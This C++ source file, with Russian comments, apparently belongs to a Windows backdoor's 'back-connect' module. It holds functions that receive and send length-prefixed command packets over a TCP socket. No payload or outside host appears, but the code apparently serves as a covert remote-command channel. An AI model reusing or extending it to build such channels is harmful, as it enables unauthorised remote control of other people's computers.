#include <windows.h>

#include "backconnect.h"

void Backconnect::init(void)
{

}

void Backconnect::uninit(void)
{

}

bool Backconnect::_readCommand(SOCKET s, COMMAND *command, LPBYTE *data)
{
  WORD size[2];
  
  //Получаем основные данные.
  if(!WSocket::tcpRecvAll(s, size, sizeof(WORD) * 2, SOCKET_TIMEOUT) || size[0] <= sizeof(WORD) * 2)return false;

  //Получаем следующие данные структуры.
  LPBYTE buffer = (LPBYTE)Mem::alloc(size[0]);
  if(buffer == NULL)
  {
    WSocket::tcpRecvAllToNull(s, size[0] - sizeof(WORD) * 2 + size[1], SOCKET_TIMEOUT);
    return false;
  }

  if(!WSocket::tcpRecvAll(s, buffer, size[0] - sizeof(WORD) * 2, SOCKET_TIMEOUT))
  {
    Mem::free(buffer);
    return false;
  }
    
  //Заполняем структуру.
  command->structSize = sizeof(COMMAND);
  command->dataSize   = size[1];
  command->command    = buffer[0];
    
  Mem::free(buffer);

  //Получаем данные.
  if(size[1] == 0)
  {
    if(data)*data = NULL;
  }
  else
  {
    if(data == NULL || (buffer = (LPBYTE)Mem::alloc(size[1] /*+ 1 safe byte*/)) == NULL)
    {
      bool r = WSocket::tcpRecvAllToNull(s, size[1], SOCKET_TIMEOUT);
      return (data == NULL ? r : false);
    }
    
    if(!WSocket::tcpRecvAll(s, buffer, size[1], SOCKET_TIMEOUT))
    {
      Mem::free(buffer);
      return false;
    }
    
    //buffer[command->dataSize] = 0;/*safe byte*/
    *data = buffer;
  }

  return true;
}

bool Backconnect::_writeCommand(SOCKET s, BYTE command, const void *data, WORD dataSize)
{
  COMMAND bcc;
  bcc.structSize = sizeof(COMMAND);
  bcc.dataSize   = dataSize;
  bcc.command    = command;

  return (WSocket::tcpSend(s, &bcc, sizeof(COMMAND)) && (dataSize == 0 || WSocket::tcpSend(s, data, dataSize)));
}
